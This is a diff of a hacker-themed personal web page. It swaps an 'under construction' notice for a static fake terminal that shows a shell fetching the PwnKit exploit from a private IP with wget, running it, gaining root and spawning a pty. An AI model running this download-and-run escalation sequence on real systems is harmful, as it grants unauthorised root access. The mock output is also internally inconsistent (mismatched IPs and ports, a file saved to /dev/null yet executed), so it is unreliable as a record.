@@ -3,16 +3,40 @@
 	<head>
 		<title># whoami</title>
 		<link rel="stylesheet" href="index.css">
-		<script src="script.js"></script>
+		<script src="c2NyaXB0.js"></script>
 	</head>
 	<body id="#app">
-		<section class="code-block">
-			<p><span class="ln">1 </span>root@serv:~# id</p>
-			<p><span class="ln">2 </span>uid=0(root) gid=0(root) groups=0(root)</p>
-			<p><span class="ln">3 </span>root@serv:~# echo \nHello! This website is currently under construction, please come back later!</p>
-			<p><span class="ln">4 </span</p>
-			<p><span class="ln">5 </span><span style="color: yellow">Hello! This website is currently under construction, please come back later!</span></p>
-		</section>
+		<!--<section class="code-block">
+			<p>root@serv:~# id</p>
+			<p>>uid=0(root) gid=0(root) groups=0(root)</p>
+			<p>root@serv:~# echo \nHello! This website is currently under construction, please come back later!</p>
+			<p><span style="color: yellow">Hello! This website is currently under construction, please come back later!</span></p>
+		</section>-->
+		<div class="terminal" id="terminal">
+			<p>www-data@serv:~$ wget http://192.168.92.122:8000/PwnKit</p>
+			<p>--2022-08-29 15:30:22-- http://192.168.92.122:8000/PwnKit</p>
+			<p>Resolving 192.168.92.122:8000 (192.168.92.122:8000)... 192.168.92.112</p>
+			<p>Connecting to 192.168.92.112:8000 (192.168.92.122:800)... connected</p>
+			<p>HTTP request sent, awaiting response... 200 OK</p>
+			<p>Length: 549 (549)</p>
+			<p>Saving to: ‘/dev/null’</p>
+			<p>100%[==================================================] 549/549     0kB/s   in 0s     0s</p>
+			<p>www-data@serv:~$ chmod +x PwnKit</p>
+			<p>www-data@serv:~$ ./PwnKit</p>
+			<p># id</p>
+			<p>uid=0(root) gid=0(root) groups=0(root)</p>
+			<p># python -c "import pty;pty.spawn('/bin/bash')"</p>
+			<p><span style="color: yellow">Type "help" for a list of commands!</span></p>
+			<div class="input-line" id="input-line">
+				<p>root@serv:~# </p> <p id="jsinput"></p>
+				<div class="beam" id="beam"></div>
+			</div>
+		</div>
+
+		<div class="footer">
+			<h2>This website is still under construction, apologies if the interaction is not satisfying, this is just a rough sketch.</h2>
+			<h3>Discord: shellshock#0101</h3>
+		</div>
 	</body>
 	<!-- Website under construction -->
 </html>
